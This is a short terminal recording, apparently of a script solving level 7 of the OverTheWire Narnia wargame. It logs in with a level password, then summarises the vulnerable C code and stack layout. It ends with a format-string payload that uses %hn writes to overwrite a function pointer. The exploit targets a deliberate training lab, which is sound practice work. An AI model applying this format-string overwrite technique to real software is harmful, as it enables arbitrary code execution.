{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793495017,"idle_time_limit":2.0,"command":"bash /home/claude/solves/narnia/L7.sh","title":"Narnia L7 -> narnia8: format string writes hackedfunction into ptrf","env":{"SHELL":"/bin/bash"}}
[0.002, "o", "$ ssh narnia7@narnia.labs.overthewire.org -p 2226   # password Hwsfol90tt\r\n$ cat /narnia/narnia7.c   # char buffer[128]; int (*ptrf)(); snprintf(buffer,128,argv[1]); ptrf()\r\n$ objdump: ptrf at ebp-0x84, buffer at ebp-0x80 -> ptrf is BELOW buffer\r\n$ gdb: vararg1 = ptrf value; vararg2 = buffer[0..3]; vararg3 = buffer[8..11]\r\n$ gdb: the format string itself is far up the stack at arg index 152\r\n$ the program prints hackedfunction addr and &ptrf -> probe first (same arg len)\r\n$ fmt = [&ptrf+2][&ptrf] %<hi-8>c%152$hn %<lo-hi>c%153$hn -> ptrf = hackedfunction\r\n"]
